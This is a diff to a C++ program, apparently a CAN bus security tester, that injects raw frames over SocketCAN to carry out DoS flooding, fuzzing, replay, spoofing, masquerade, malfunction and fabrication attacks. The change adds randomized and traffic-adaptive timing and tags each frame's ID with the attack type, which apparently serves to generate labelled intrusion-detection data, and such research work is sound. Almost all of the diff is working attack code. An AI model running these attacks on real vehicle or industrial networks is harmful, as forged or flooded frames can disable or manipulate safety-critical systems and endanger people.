@@ -15,6 +15,25 @@
 #include <algorithm>
 #include <mutex>
 #include <condition_variable>
+#include <deque>
+
+enum class AttackFrequency {
+    HIGH,       // 10-50ms
+    MEDIUM,     // 100-500ms
+    LOW,        // 1-5s
+    ADAPTIVE    // Dynamically adjusts based on bus traffic
+};
+
+enum class AttackType {
+    LEGITIMATE = 0,
+    DOS = 1,
+    FUZZING = 2,
+    REPLAY = 3,
+    MALFUNCTION = 4,
+    SPOOFING = 5,
+    MASQUERADE = 6,
+    FABRICATION = 7
+};
 
 struct CANFrame {
     canid_t id;
@@ -23,7 +42,7 @@ struct CANFrame {
     std::chrono::microseconds timestamp;
 };
 
-class CANSecurityTester {
+class AdvancedCANTester {
 private:
     int socket_fd;
     struct sockaddr_can addr;
@@ -31,8 +50,15 @@ private:
     std::mutex mtx;
     std::condition_variable cv;
     bool running = true;
+    std::mt19937 rng{std::random_device{}()};
     std::vector<CANFrame> recorded_frames;
     std::map<canid_t, CANFrame> last_seen_frames;
+
+    const std::map<AttackFrequency, std::pair<int, int>> frequency_ranges = {
+        {AttackFrequency::HIGH, {10, 50}},
+        {AttackFrequency::MEDIUM, {100, 500}},
+        {AttackFrequency::LOW, {1000, 5000}}
+    };
 
     bool initializeSocket(const std::string& ifname) {
         if ((socket_fd = socket(PF_CAN, SOCK_RAW, CAN_RAW)) < 0) {
@@ -54,9 +80,32 @@ private:
         return true;
     }
 
-    bool sendFrame(const CANFrame& frame) {
+    int getRandomInterval(AttackFrequency freq) {
+        if (freq == AttackFrequency::ADAPTIVE) {
+            return calculateAdaptiveInterval();
+        }
+        
+        auto [min_ms, max_ms] = frequency_ranges.at(freq);
+        std::uniform_int_distribution<> dist(min_ms, max_ms);
+        return dist(rng);
+    }
+
+    CANFrame generateRandomFrame(bool fixed_id = false) {
+        CANFrame frame;
+        // ID는 29비트가 아닌 11비트(Standard) 또는 28비트(Extended) 범위 내에서만 생성
+        frame.id = fixed_id ? 0x001 : std::uniform_int_distribution<>(0, 0x7FF)(rng);  // Standard CAN ID 범위
+        frame.dlc = std::uniform_int_distribution<>(1, 8)(rng);
+        
+        for(int i = 0; i < frame.dlc; i++) {
+            frame.data[i] = std::uniform_int_distribution<>(0, 0xFF)(rng);
+        }
+        return frame;
+    }
+
+    bool sendFrame(const CANFrame& frame, AttackType type) {
         struct can_frame can_frame;
-        can_frame.can_id = frame.id;
+        // 원래 ID는 하위 29비트만 사용하고, 상위 3비트에 attack type 저장
+        can_frame.can_id = (frame.id & 0x1FFFFFFF) | (static_cast<uint32_t>(type) << 29);
         can_frame.can_dlc = frame.dlc;
         memcpy(can_frame.data, frame.data, frame.dlc);
         
@@ -78,57 +127,50 @@ private:
         return can_frame;
     }
 
+    std::deque<std::chrono::microseconds> traffic_timestamps;
+    const size_t TRAFFIC_WINDOW = 1000;
+    
+    int calculateAdaptiveInterval() {
+        if (traffic_timestamps.size() < 2) return 100;
+        
+        std::vector<long> intervals;
+        for (size_t i = 1; i < traffic_timestamps.size(); i++) {
+            auto diff = std::chrono::duration_cast<std::chrono::microseconds>(
+                traffic_timestamps[i] - traffic_timestamps[i-1]).count();
+            intervals.push_back(diff);
+        }
+        
+        std::nth_element(intervals.begin(), intervals.begin() + intervals.size()/2, intervals.end());
+        long median_us = intervals[intervals.size()/2];
+        
+        int base_ms = static_cast<int>(median_us / 1000);
+        std::uniform_int_distribution<> dist(base_ms * 0.9, base_ms * 1.1);
+        return dist(rng);
+    }
+    
+    void updateTrafficPattern(const CANFrame& frame) {
+        traffic_timestamps.push_back(frame.timestamp);
+        if (traffic_timestamps.size() > TRAFFIC_WINDOW) {
+            traffic_timestamps.pop_front();
+        }
+    }
+
 public:
-    CANSecurityTester(const std::string& interface = "can0") {
+    AdvancedCANTester(const std::string& interface = "can0") {
         if (!initializeSocket(interface)) {
             throw std::runtime_error("Failed to initialize CAN socket");
         }
     }
 
-    ~CANSecurityTester() {
+    ~AdvancedCANTester() {
         close(socket_fd);
+        running = false;
+        cv.notify_all();
     }
 
-    // 1. DOS Attack
-    void dosAttack(int frequency_ms) {
-        CANFrame frame;
-        frame.id = 0x000;  // Highest priority
-        frame.dlc = 8;
-        memset(frame.data, 0x00, 8);
-
-        std::cout << "Starting DOS attack with " << frequency_ms << "ms frequency\n";
-        
-        while(running) {
-            sendFrame(frame);
-            std::this_thread::sleep_for(std::chrono::milliseconds(frequency_ms));
-        }
-    }
-
-    // 2. Fuzzing Attack
-    void fuzzingAttack(int frequency_ms) {
-        std::random_device rd;
-        std::mt19937 gen(rd());
-        std::uniform_int_distribution<> id_dist(0, 0x7FF);
-        std::uniform_int_distribution<> dlc_dist(0, 8);
-        std::uniform_int_distribution<> data_dist(0, 255);
-
-        std::cout << "Starting Fuzzing attack with " << frequency_ms << "ms frequency\n";
-
-        while(running) {
-            CANFrame frame;
-            frame.id = id_dist(gen);
-            frame.dlc = dlc_dist(gen);
-            for(int i = 0; i < frame.dlc; i++) {
-                frame.data[i] = data_dist(gen);
-            }
-            sendFrame(frame);
-            std::this_thread::sleep_for(std::chrono::milliseconds(frequency_ms));
-        }
-    }
-
-    // 3. Record Traffic for Replay Attacks
     void recordTraffic(int duration_seconds) {
         recorded_frames.clear();
+        traffic_timestamps.clear();
         auto start_time = std::chrono::steady_clock::now();
         
         while(std::chrono::duration_cast<std::chrono::seconds>(
@@ -136,91 +178,103 @@ public:
             CANFrame frame = receiveFrame();
             recorded_frames.push_back(frame);
             last_seen_frames[frame.id] = frame;
+            updateTrafficPattern(frame);
         }
     }
 
-    // 3.1 Basic Replay Attack
-    void replayAttack(int frequency_ms) {
-        std::cout << "Starting Replay attack with " << frequency_ms << "ms frequency\n";
-        
+    void dosAttack(AttackFrequency freq) {
+        std::cout << "Starting DoS attack\n";
+        CANFrame frame;
+        frame.id = 0x000;
+        frame.dlc = 8;
+        memset(frame.data, 0xFF, 8);
+
+        while(running) {
+            sendFrame(frame, AttackType::DOS);
+            std::this_thread::sleep_for(std::chrono::milliseconds(getRandomInterval(freq)));
+        }
+    }
+
+    void fuzzingAttack(AttackFrequency freq) {
+        std::cout << "Starting Fuzzing attack\n";
+        while(running) {
+            sendFrame(generateRandomFrame(), AttackType::FUZZING);
+            std::this_thread::sleep_for(std::chrono::milliseconds(getRandomInterval(freq)));
+        }
+    }
+
+    void replayAttack(AttackFrequency freq) {
+        std::cout << "Starting Replay attack\n";
         while(running && !recorded_frames.empty()) {
             for(const auto& frame : recorded_frames) {
-                sendFrame(frame);
-                std::this_thread::sleep_for(std::chrono::milliseconds(frequency_ms));
+                sendFrame(frame, AttackType::REPLAY);
+                std::this_thread::sleep_for(std::chrono::milliseconds(getRandomInterval(freq)));
             }
         }
     }
 
-    // 3.2 Situational Replay Attack
-    void situationalReplayAttack(int frequency_ms, std::function<bool(const CANFrame&)> condition) {
+    void situationalReplayAttack(AttackFrequency freq, std::function<bool(const CANFrame&)> condition) {
         std::cout << "Starting Situational Replay attack\n";
-        
         while(running && !recorded_frames.empty()) {
             for(const auto& frame : recorded_frames) {
                 if(condition(frame)) {
-                    sendFrame(frame);
-                    std::this_thread::sleep_for(std::chrono::milliseconds(frequency_ms));
+                    sendFrame(frame, AttackType::REPLAY);
+                    std::this_thread::sleep_for(std::chrono::milliseconds(getRandomInterval(freq)));
                 }
             }
         }
     }
 
-    // 4. Malfunction Attack
-    void malfunctionAttack(canid_t target_id, std::function<void(uint8_t*)> data_modifier, int frequency_ms) {
-        std::cout << "Starting Malfunction attack on ID: 0x" << std::hex << target_id << "\n";
-        
+    void malfunctionAttack(AttackFrequency freq) {
+        std::cout << "Starting Malfunction attack\n";
         while(running) {
-            if(last_seen_frames.count(target_id)) {
-                CANFrame frame = last_seen_frames[target_id];
-                data_modifier(frame.data);
-                sendFrame(frame);
+            CANFrame frame = generateRandomFrame(true);
+            for(int i = 0; i < frame.dlc; i++) {
+                frame.data[i] ^= 0xFF;
             }
-            std::this_thread::sleep_for(std::chrono::milliseconds(frequency_ms));
+            sendFrame(frame, AttackType::MALFUNCTION);
+            std::this_thread::sleep_for(std::chrono::milliseconds(getRandomInterval(freq)));
         }
     }
 
-    // 5. Spoofing Attack
-    void spoofingAttack(canid_t target_id, const uint8_t* data, uint8_t dlc, int frequency_ms) {
-        CANFrame frame;
-        frame.id = target_id;
-        frame.dlc = dlc;
-        memcpy(frame.data, data, dlc);
-
-        std::cout << "Starting Spoofing attack for ID: 0x" << std::hex << target_id << "\n";
-        
+    void spoofingAttack(AttackFrequency freq) {
+        std::cout << "Starting Spoofing attack\n";
         while(running) {
-            sendFrame(frame);
-            std::this_thread::sleep_for(std::chrono::milliseconds(frequency_ms));
+            CANFrame frame = generateRandomFrame(true);
+            sendFrame(frame, AttackType::SPOOFING);
+            std::this_thread::sleep_for(std::chrono::milliseconds(getRandomInterval(freq)));
         }
     }
 
-    // 6. Masquerade Attack
-    void masqueradeAttack(canid_t original_id, canid_t masquerade_id, int frequency_ms) {
+    void masqueradeAttack(AttackFrequency freq) {
         std::cout << "Starting Masquerade attack\n";
-        
-        while(running) {
-            if(last_seen_frames.count(original_id)) {
-                CANFrame frame = last_seen_frames[original_id];
-                frame.id = masquerade_id;
-                sendFrame(frame);
+        while(running && !recorded_frames.empty()) {
+            for(const auto& frame : recorded_frames) {
+                CANFrame modified = frame;
+                modified.id = 0x001;
+                sendFrame(modified, AttackType::MASQUERADE);
+                std::this_thread::sleep_for(std::chrono::milliseconds(getRandomInterval(freq)));
             }
-            std::this_thread::sleep_for(std::chrono::milliseconds(frequency_ms));
         }
     }
 
-    // 7. Fabrication Attack
-    void fabricationAttack(const std::vector<CANFrame>& fabricated_frames, int frequency_ms) {
+    void fabricationAttack(AttackFrequency freq) {
         std::cout << "Starting Fabrication attack\n";
+        std::vector<CANFrame> fabricated_frames;
         
+        for(int i = 0; i < 5; i++) {
+            CANFrame frame = generateRandomFrame(true);
+            fabricated_frames.push_back(frame);
+        }
+
         while(running) {
             for(const auto& frame : fabricated_frames) {
-                sendFrame(frame);
-                std::this_thread::sleep_for(std::chrono::milliseconds(frequency_ms));
+                sendFrame(frame, AttackType::FABRICATION);
+                std::this_thread::sleep_for(std::chrono::milliseconds(getRandomInterval(freq)));
             }
         }
     }
 
-    // Utility: Stop all attacks
     void stop() {
         running = false;
         cv.notify_all();
@@ -228,55 +282,57 @@ public:
 };
 
 int main(int argc, char** argv) {
-    if(argc < 3) {
-        std::cerr << "Usage: " << argv[0] << " <attack_type> <frequency_ms> [additional_params...]\n";
-        std::cerr << "Attack types: dos, fuzz, replay, situational_replay, malfunction, spoofing, masquerade, fabrication\n";
+    if(argc != 3) {
+        std::cerr << "Usage: " << argv[0] << " <attack_type> <frequency>\n"
+                  << "Attack types: dos, fuzz, replay, situational_replay, malfunction, "
+                  << "spoofing, masquerade, fabrication\n"
+                  << "Frequency: high(10-50ms), medium(100-500ms), low(1000ms-5000ms), adaptive\n";
         return 1;
     }
 
     try {
-        CANSecurityTester tester("can0");
         std::string attack_type = argv[1];
-        int frequency_ms = std::stoi(argv[2]);
+        std::string freq_str = argv[2];
+        
+        AttackFrequency freq;
+        if(freq_str == "high") freq = AttackFrequency::HIGH;
+        else if(freq_str == "medium") freq = AttackFrequency::MEDIUM;
+        else if(freq_str == "low") freq = AttackFrequency::LOW;
+        else if(freq_str == "adaptive") freq = AttackFrequency::ADAPTIVE;
+        else throw std::invalid_argument("Invalid frequency level");
+
+        AdvancedCANTester tester("can0");
 
         if(attack_type == "dos") {
-            tester.dosAttack(frequency_ms);
+            tester.dosAttack(freq);
         }
         else if(attack_type == "fuzz") {
-            tester.fuzzingAttack(frequency_ms);
+            tester.fuzzingAttack(freq);
         }
         else if(attack_type == "replay") {
-            tester.recordTraffic(10); // Record 10 seconds
-            tester.replayAttack(frequency_ms);
+            tester.recordTraffic(10);
+            tester.replayAttack(freq);
         }
         else if(attack_type == "situational_replay") {
             tester.recordTraffic(10);
-            // Example: Only replay frames with ID 0x100
-            tester.situationalReplayAttack(frequency_ms, [](const CANFrame& frame) {
-                return frame.id == 0x100;
+            tester.situationalReplayAttack(freq, [](const CANFrame& frame) {
+                return frame.id == 0x001;
             });
         }
         else if(attack_type == "malfunction") {
-            // Example: Flip all bits in the data
-            tester.malfunctionAttack(0x100, [](uint8_t* data) {
-                for(int i = 0; i < 8; i++) data[i] = ~data[i];
-            }, frequency_ms);
+            tester.malfunctionAttack(freq);
         }
         else if(attack_type == "spoofing") {
-            uint8_t fake_data[8] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08};
-            tester.spoofingAttack(0x100, fake_data, 8, frequency_ms);
+            tester.spoofingAttack(freq);
         }
         else if(attack_type == "masquerade") {
-            tester.masqueradeAttack(0x100, 0x200, frequency_ms);
+            tester.masqueradeAttack(freq);
         }
         else if(attack_type == "fabrication") {
-            std::vector<CANFrame> fabricated_frames;
-            // Add fabricated frames here
-            tester.fabricationAttack(fabricated_frames, frequency_ms);
+            tester.fabricationAttack(freq);
         }
         else {
-            std::cerr << "Unknown attack type: " << attack_type << "\n";
-            return 1;
+            throw std::invalid_argument("Unknown attack type");
         }
     }
     catch(const std::exception& e) {
